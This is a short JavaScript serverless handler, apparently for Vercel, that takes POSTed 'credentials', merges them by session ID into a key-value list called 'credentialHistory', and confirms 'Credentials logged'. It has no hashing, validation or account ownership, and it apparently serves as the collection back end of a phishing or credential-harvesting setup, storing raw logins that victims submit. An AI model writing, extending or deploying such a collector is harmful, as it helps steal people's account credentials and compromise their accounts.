import { kv } from '@vercel/kv';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const newCreds = req.body;
        let credentials = (await kv.get('credentialHistory')) || [];
        const existingSession = credentials.find(cred => cred.sessionId === newCreds.sessionId);
        if (existingSession) {
            Object.assign(existingSession, newCreds);
        } else {
            credentials.push(newCreds);
        }
        await kv.set('credentialHistory', credentials);
        res.status(200).json({ message: 'Credentials logged' });
    } catch (err) {
        console.error('Error logging credentials:', err);
        res.status(500).json({ error: 'Server error' });
    }
}
